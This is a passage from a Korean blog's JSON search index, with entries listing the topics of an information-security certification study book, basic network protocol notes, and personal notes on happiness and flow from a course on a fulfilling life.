SSL/TLS 관련 취약점            OpenSSL Heartbleed           NTP 분산 서비스 거부(DDoS) 취약점   SSDP 분산 서비스 거부(DDos) 취약점   PART 05 정보보안 일반/관리   SECTION 17 정보보안 일반/관리     정보보호개요            예방 통제, 탐지 통제, 교정 통제       생체인증 (보편성, 유일성, 지속성, 성능, 수용성, 저항성)       논리폭탄       커버로스 인증           암호학            대칭키 암호화       공개키 암호화       전자서명       PKI       스트림 암호화 / 블록 암호화       암호분석 방법       Diffie-Hellman 키 교환 알고리즘       RSA       Hash 함수           접근통제            MAC / DAC / RBAC       CL / ACL       Bell-Lapadula / Biba / Clark and Wilson / Chinese Wall           정보보호관리   위험관리(Risk Management)            위험관리 체계       접근방식에 따른 위험분석 기법       정량적 위험분석 / 정성적 위험분석       위험에 따른 손실액 분석           PART 06 정보보안 법규   SECTION 18 정보보안 법규     법규관련 개요   개인정보보호법(시행:2020.08.05.)   개인정보의 안전성 확보조치 기준(시행:2021.09.15.)   개인정보의 기술적·관리적 보호조치 기준(시행:2021.09.15.)   정보통신망 이용촉진 및 정보보호 등에 관한 법률(시행:2021.12.09.)   정보통신기반보호법(시행:2020.12.10.)   전자서명법(시행:2021.06.10.)   위치정보의 보호 및 이용 등에 관한 법률(시행:2021.02.05.)            ISMS-P       ISMS 의무인증 대상       ISMS-P 관리체계 인증심사       정보보호 거버넌스 체계 수립       정보보호 위험 평가 (자산/위험/위협/취약점)       CC 인증       개인정보 영향평가 제도       개인정보보호법       정보통신기반 보호법           -문제편-   Section 01 시스템 보안     시스템 보안 단답형   시스템 보안 서술형   시스템 보안 실무형   Section 02 네트워크 보안     네트워크 보안 단답형   네트워크 보안 서술형   네트워크 보안 실무형   Section 03 어플리케이션 보안     어플리케이션 보안 단답형   어플리케이션 보안 서술형   어플리케이션 보안 실무형   Section 04 침해사고 분석 및 대응     침해사고 분석 및 대응 단답형   침해사고 분석 및 대응 서술형   침해사고 분석 및 대응 실무형   Section 05 정보보안 일반     정보보안 일반 단답형   정보보안 일반 서술형   정보보안 일반 실무형   Section 06 정보보안관리/법규     정보보안관리/법규 단답형   정보보안관리/법규 서술형   정보보안관리/법규 실무형  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사 실기","알기사 정보보안기사 실기"],
        "url": "https://bluesplatter.com/is_certification/IST-Book-List/",
        "teaser": null
      },{
        "title": "정보보안기사 실기 - 01.네트워크",
        "excerpt":"프로토콜 (Protocol)   프로토콜의 특징     단편화(Fragmentation) : 긴 데이터 블록을 손쉽게 전송할 수 있도록 크기가 똑같은 작은 블록으로 나누어 전송   재조립(Assembly) : 수신 측에서 쪼개진 작은 데이터 블록을 재합성하여 원래의 메시지로 복원   캡슐화(Encapsulation) : 각 프로토콜에 적합한 데이터 블록을 만들려고 데이터에 정보를 추가하는 것   연결제어(Connection Control) : 비연결 데이터 전송(데이터그램), 연결 위주 데이터 전송(가상회선)을 위한 통신로를 개설,유지, 종결하는 기능   오류제어(Error Control) : 데이터 전송 중 발생할 수 있는 오류나 착오 등을 검출하고 정정   동기화(Synchronization) : 두 통신 객체의 상태 (시작, 종류, 검사 등) 을 일치시키는 기능   다중화(Multiplexing) : 하나의 통신로를 여러 개로 나누거나 회선 여러 개를 하나의 통신로로 변환시켜 다수의 가입자가 동시에 사용할 수 있도록 하는 기능   주소지정(Addressing) : 발생지, 목적지 등의 주소를 명기하여 데이터를 정확하게 전달하는 기능   전송서비스(Transmission Service) : 데이터 전송 중 발생할 수 있는 오류나 착오 등을 검출하고 정정하는 기능   통신 프로토콜의 종류     TCP(Transmission Control Protocol)  ","categories": ["IS_Certification"],
        "tags": ["정보보안기사 실기","네트워크"],
        "url": "https://bluesplatter.com/is_certification/IST-Part1_Network/",
        "teaser": null
      },{
        "title": "행복하고 보람찬 삶 - 행복을 방해하는 7요소 - 행복 가치의 과소평가",
        "excerpt":"Sins (행복을 방해하는 7 요소)   행복 가치의 과소평가     어떻게 행복 가치를 과소평가 하는가?            다른 가치를 위해 행복을 희생                    샐러드바에서 먹고싶은 요리보다 비싼 요리를 가져오고, 다 먹지 못함 (돈의 가치를 우선함)           직업을 선택함에 있어서 행복이 아닌 외적 요소를 우선하여 선택함                           왜 행복 가치를 과소평가 하는가?            행복에 대한 부정적인 믿음 - 건강한 음식이 끌리지 않는 것과 비슷함 (건강한 음식이 맛이없다)                    행복은 게으름이다. –&gt; 사실은 행복할 때 더 창의적이게 됨           행복은 이기적이다. –&gt; 사실은 행복할 때 더 친절하게 됨           행복은 덧없다. –&gt; 행복을 어떻게 정의하느냐에 따라 다르다. (감각적 즐거움 &lt; 사랑,연결 &lt; 풍요로움-돌봄을 받고 있다는 느낌)                       행복을 정확히 정의하는데 실패                    Fluency Effect : 더 쉽게 인지하고 이해할 수 있는 것에 더 큰 가치를 부여함                       수단의 극대화 (Medium Maximization) : 원하는 것을 얻기 위한 수단에만 집착하는 것           방안            행복을 좇기보다 우선 순위로 매기기                    행복을 우선순위로 한 선택을 지속하면 행복 수치를 상당히 많이 끌어올릴 수 있음           그러나 행복을 열심히 추구하면 지금 감정과 행복할 때 느끼는 감정을 비교하게 됨           행복을 증진시키는 결정을 내리되, 행복 수치를 꾸준하게 관찰하지 않는 것                       행복의 의미를 정확히 정의하는 것                    감각적 쾌락 - 유지하기 어려움           오만한 자존심 (타인보다 우월함) - 유지하기 어려움           진정한 자존심 (이전의 자신보다 잘하고 있음)           사랑 혹은 유대감           풍족함 (삶이 완전하지 않기에 더 흥미로움) - 가장 지속력 있는 정의                           나의 과제            나만의 행복을 정의하기                    선한 영향력을 통한 유대                       스스로 정의한 행복에 맞게 자신을 행복하게 하는 것들을 정의                    금전적 성공 (금전적 자유)           무언가를 원할 때 할 수 있는 것 (시간/선택의 자유)           자신의 삶을 사랑하고 돌보는 것 (발전)           어떠한 일에 능숙한 것 (능력적 자유)           –&gt; 내 그릇에 맞는 범위에서 이로운 사람이 되기                           우월함 추구 : 다른 사람보다 우월함에서 행복을 추구  애정 결핍 혹은 회피  과하게 통제하려 하는 태도 : 다른사람이나 결과가 내가 원하는 방향으로 통제되도록 노력하는 것  타인을 믿지 않는 태도  인생에서 나타나는 결과나 일을 불신 (부정적 태도)  내부의 원천 (source within) 을 사용할 의자가 없거나 사용하지 못하는 것   Habits (습관)   Exercises (활동)  ","categories": ["행복하고 보람찬 삶"],
        "tags": ["A Life of Happiness and Fulfillment","불행의 7요소","행복 가치의 과소평가","행복"],
        "url": "https://bluesplatter.com/%ED%96%89%EB%B3%B5%ED%95%98%EA%B3%A0%20%EB%B3%B4%EB%9E%8C%EC%B0%AC%20%EC%82%B6/Hapiness-7-Happiness-Sins-Undervalued/",
        "teaser": null
      },{
        "title": "행복하고 보람찬 삶 - 행복을 방해하는 7요소 - 행복 가치의 과소평가",
        "excerpt":"Sins (행복을 방해하는 7 요소)   행복 가치의 과소평가     어떻게 행복 가치를 과소평가 하는가?            다른 가치를 위해 행복을 희생                    샐러드바에서 먹고싶은 요리보다 비싼 요리를 가져오고, 다 먹지 못함 (돈의 가치를 우선함)           직업을 선택함에 있어서 행복이 아닌 외적 요소를 우선하여 선택함                           왜 행복 가치를 과소평가 하는가?            행복에 대한 부정적인 믿음 - 건강한 음식이 끌리지 않는 것과 비슷함 (건강한 음식이 맛이없다)                    행복은 게으름이다. –&gt; 사실은 행복할 때 더 창의적이게 됨           행복은 이기적이다. –&gt; 사실은 행복할 때 더 친절하게 됨           행복은 덧없다. –&gt; 행복을 어떻게 정의하느냐에 따라 다르다. (감각적 즐거움 &lt; 사랑,연결 &lt; 풍요로움-돌봄을 받고 있다는 느낌)                       행복을 정확히 정의하는데 실패                    Fluency Effect : 더 쉽게 인지하고 이해할 수 있는 것에 더 큰 가치를 부여함                       수단의 극대화 (Medium Maximization) : 원하는 것을 얻기 위한 수단에만 집착하는 것           방안            행복을 좇기보다 우선 순위로 매기기                    행복을 우선순위로 한 선택을 지속하면 행복 수치를 상당히 많이 끌어올릴 수 있음           그러나 행복을 열심히 추구하면 지금 감정과 행복할 때 느끼는 감정을 비교하게 됨           행복을 증진시키는 결정을 내리되, 행복 수치를 꾸준하게 관찰하지 않는 것                       행복의 의미를 정확히 정의하는 것                    감각적 쾌락 - 유지하기 어려움           오만한 자존심 (타인보다 우월함) - 유지하기 어려움           진정한 자존심 (이전의 자신보다 잘하고 있음)           사랑 혹은 유대감           풍족함 (삶이 완전하지 않기에 더 흥미로움) - 가장 지속력 있는 정의                           나의 과제            나만의 행복을 정의하기                    선한 영향력을 통한 유대                       스스로 정의한 행복에 맞게 자신을 행복하게 하는 것들을 정의                    금전적 성공 (금전적 자유)           무언가를 원할 때 할 수 있는 것 (시간/선택의 자유)           자신의 삶을 사랑하고 돌보는 것 (발전)           어떠한 일에 능숙한 것 (능력적 자유)           –&gt; 내 그릇에 맞는 범위에서 이로운 사람이 되기                           우월함 추구 : 다른 사람보다 우월함에서 행복을 추구  애정 결핍 혹은 회피  과하게 통제하려 하는 태도 : 다른사람이나 결과가 내가 원하는 방향으로 통제되도록 노력하는 것  타인을 믿지 않는 태도  인생에서 나타나는 결과나 일을 불신 (부정적 태도)  내부의 원천 (source within) 을 사용할 의자가 없거나 사용하지 못하는 것   Habits (습관)   Exercises (활동)  ","categories": ["행복하고 보람찬 삶"],
        "tags": ["A Life of Happiness and Fulfillment","불행의 7요소","행복 가치의 과소평가","행복"],
        "url": "https://bluesplatter.com/%ED%96%89%EB%B3%B5%ED%95%98%EA%B3%A0%20%EB%B3%B4%EB%9E%8C%EC%B0%AC%20%EC%82%B6/Hapiness-7-Happiness-Sins/",
        "teaser": null
      },{
        "title": "행복하고 보람찬 삶 - 행복을 방해하는 7요소 - 우월함 추구",
        "excerpt":"Sins (행복을 방해하는 7 요소)   행복 가치의 과소평가   우월함 추구 : 다른 사람보다 우월함에서 행복을 추구      왜 우월함을 추구하는가?            타인의 인정을 받고 기분이 좋음       타인의 인정이 없더라도 이길 땐 기분이 좋음 (자존심을 높임)       타인과 비교하면서 얼마나 발전(숙달)했는지 느낌       자율성, 자주성을 더 누릴 수 있음           어떻게 우월함 추구는 행복도를 떨어뜨리는가?            사회적 비교                    자신과 타인을 비교하거나 남과 경쟁                       물질주의 (우월함을 비교하기 위한 가장 편한 방법)                    고립되어 외로워짐           적응하여 감정이 오래 가지 않음                       우월함을 좇을 때 타인이 덜 좋아하게 됨                    자기중심적이 되고 타인을 덜 배려하게 됨                           우월함을 좇는 것이 성공에 정말 중요한 요소인가?            사회적 통념                    우월함을 좇는 것은 성취와 성공의 연료라고 여김           하지만 과연 우월함을 좇는 것이 실제로 성공으로 이어지는 것인가?                       진실                    과제가 인지적 사고나 창의적 사고를 요하는 경우, 우월해지고자 하는 욕구는 스트레스를 일으켜 뇌의 기능이 저하됨                            최고의 강사가 되고자 하는 욕구가 강의컨텐츠의 질을 향상시키는 노력에는 도움이 되나               학생 앞에서 실제 수업을 할때는 경쟁심으로 인해 실제 핵심사항의 성취에 방해가 됨                                    과제가 지적인 능력을 요하지 않는 경우 우월함을 좇는 것이 도움이 됨. (예:스포츠 종목)                   스트레스를 받지 않는 환경에서는 우월함을 좇는 것이 도움이 됨. (더 많은 준비를 하는 방식 등)                                                                   무언가를 하기 위해 스스로 동기를 가지는 경우, 잘해야 한다는 압박감을 가지는 것 자체는 좋음 (의욕 상승)           과제를 잘 수행하는 것과 관련해서는 남을 이기고자 하는 압박감으로 인해 좋은 결과를 얻을 수 없음.                       결론                    우월함을 좇는 것 외에 다른 방법을 통해 동기를 찾는 것이 좋음                            인간은 자신이 의미 있는 삶을 산다고 생각하지 않으면 행복하지 않다는 점에서 아주 독특한 존재               사람들은 실제로 자신이 가장 의미 있다고 생각하는 것을 할때 가장 행복함 &gt; 몰입 (Flow)                                                   몰입 (Flow)            몰입의 특징                    시간에 관한 왜곡된 인식을 가지는 것                            테니스에서 서브를 받을 때 슬로우 모션으로 느껴지는 것               테니스 게임이 끝나고 시계를 보았을 때 생각한 것보다 훨씬 더 많은 시간이 지나있는 것                                   자의식 부족                            일에 모든 것을 쏟아 부어 스스로를 관찰하고 판단할 여력이 남아있지 않은 상태                                   현재의 순간에 고도로 집중하는 것                       어떠한 경우에 몰입을 경험하게 되는가?                    초조함(상대가 잘함)과 지루함(상대가 못함)의 감정 사이의 구간                            현재 기술을 자신이 목표로 하는 수준이나 조금 더 나은 수준으로 끌어올려야 하는 경우               몰입을 위해서는 초보자 이상의 스킬이 필요함 (초보자 vs 초보자)                                   몰입을 경험하는 것은 내 인생의 목표를 인지하는 것에 척도가 될 수 있음.                       왜 몰입은 행복을 증진시키는가?                    몰입하는 순간에 즐거움을 느낌                            몰입을 경험하는 것은 의미있는 일인데, 사람은 의미있는 것에 즐거움을 느낌               New, Creative, Original -&gt; Meaningful, Grow, Evolve                                   대중은 몰입하는 사람들을 좋아함.                            외적인 보상은 제로섬 게임인 것에 비해 몰입에서 느끼는 즐거움은 자신보자 못한 사람들에 의지하지 않는다는 것을 의미                                               왜 몰입은 성공확률을 높이는가?                    우월함을 좇는 것이 성공확률을 높이는 길이 아닐까? 야구선수로서의 마이클조던의 예                            그는 농구만큼이나 야구도 열심히 연습했지만 성공하진 못했음.               그의 능력은 농구에 더 적합했음               야구 기술을 농구 기술을 익히는 것만큼 시간을 투자하지 않았음.                                   한 분야에 정통하려면 1만시간의 몰입 (10년) 의 시간이 필요함.                            성공할 확률, 행복 모두 증가                                   Practical Job (살기위한 직업) 이 아닌 진정 몰입할 수 있는 직업을 가지는 것이 성공에 도움이 됨.                       몰입을 실 생활에 적용하는 법                    직장에서의 몰입                            자신의 직업에 만족하지 않는 사람은 이러한 사실을 부끄럽게 생각하고 자신의 일을 무의미하다고 생각하거나 이에 만족하는 것이 좋지 않다고 생각함.               이러한 이유로 하루 아침에 많은 사람들이 자신의 직업을 그만두고 더 의미있는 일을 하길 바람.               하지만 이는 영원히 꿈으로 남게 됨. &gt; 이를 실행하기에는 두려움.                                   해법                            새로운 취미를 만들거나 이전에 가졌던 취미를 다시 해보기                                    취미에는 진입장벽이 없음.                   책 읽기, 영화보기, 여행(새로운 문화 경험), 운동, 다른사람들과 어울리기 - 매주 2~3시간 정도로 시작                   취미와 관련된 도전을 해야 함                                               직장에서 몰입을 경험하기 (아래 항목의 교집합 찾기)                                    자신이 좋아하는 일이나 잘하는 일을 찾아 재능을 키우기 -&gt; 직업에 적용 (직업과 관련된 실력 쌓기)                   자기 주변의 커뮤니티를 인식하고 니즈를 파악하기 (얻는것이 아닌 돕는 것에 초점)                                               좋아하거나 잘하는 일을 찾기                                    좋아하거나 잘하는 일을 찾는것은 쉽지 않음 -&gt; 여러 가지를 시험해보기                   관심 있는 일을 하는 다른 사람들을 만나보기                   색다른 일을 해보기                                               자신이 더 의미 있고 만족할 만한 직업으로 이직하는 것                                    좋아하거나 잘하는 일을 찾는 것을 선행해야 함                                                                                   우월성에 대한 욕구를 줄이기 위한 전략            우월함을 다시 추구하게 되는 함정 : 몰입을 통해 분야에 정통해지고, 보상(주목)을 받아 다시 우월함을 좇게 되는 굴레       일이 잘못되고 있을 때 : 자기 연민                    중요한 시험을 잘못 본 상황 - 자괴감과 죄책감, 두려움, 우울, 불안           모든 것은 완벽할 수 없지만, 사람들은 자기 자신의 실패에 대해 원래는 해서는 안될, 자기자신만이 실패자인 것 같은 고독감을 느낌                            사실은 모두가 실패를 하며, 이 때 타인과 유대를 느낄 수 있는 기회가 될 수 있음.                                   사람은 자신에 대해 더 불친절하고 잔인하게 말하는 경향이 있음 (자신이 아끼는 사람들에 대해서 절대로 하지 않을 것들)                            더 열심히 일하거나 다음 번에 더 잘하기 위한 동기가 된다고 생각하기 때문 &gt; 실저로는 비참한 기분이 되고 동기를 잃게 됨                                   있는 그대로 받아들임.           자기 연민은 자기자신을 불쌍히 여기는 것과는 다름                            지금 나처럼 실패한 친구가 있다면, 그 친구에게 어떻게 말해줄 것인가? - 자기연민을 신청할 수 있는 방법                                               일이 잘 풀릴 때 : 감사                    오만한 자부심을 가지는 경우 우월성에 대한 욕구를 강화시킴           함께 한 사람들에 대한 감사하는 마음을 가지기                            유대감               오만한 자부심과 유대감의 감정 사이에 감사함이 위치함                                   감사함의 효과                            더 큰 타인과의 유대감 (vs. 우월성)               다른 사람의 지지를 느낄 수 있음               고양감을 느낄 수 있음               보다 긍정적인 사고               더 긴 행복의 여운                                                   감사함을 표현하기 (실천하기)            감사함을 느끼는 사람에게 편지를 써서 전달하기           애정 결핍 혹은 회피  과하게 통제하려 하는 태도 : 다른사람이나 결과가 내가 원하는 방향으로 통제되도록 노력하는 것  타인을 믿지 않는 태도  인생에서 나타나는 결과나 일을 불신 (부정적 태도)  내부의 원천 (source within) 을 사용할 의자가 없거나 사용하지 못하는 것   Habits (습관)   Exercises (활동)  ","categories": ["행복하고 보람찬 삶"],
        "tags": ["A Life of Happiness and Fulfillment","불행의 7요소","우월함 추구","행복"],
        "url": "https://bluesplatter.com/%ED%96%89%EB%B3%B5%ED%95%98%EA%B3%A0%20%EB%B3%B4%EB%9E%8C%EC%B0%AC%20%EC%82%B6/Hapiness-7-Happiness-Sins-Superior/",
        "teaser": null
      }]
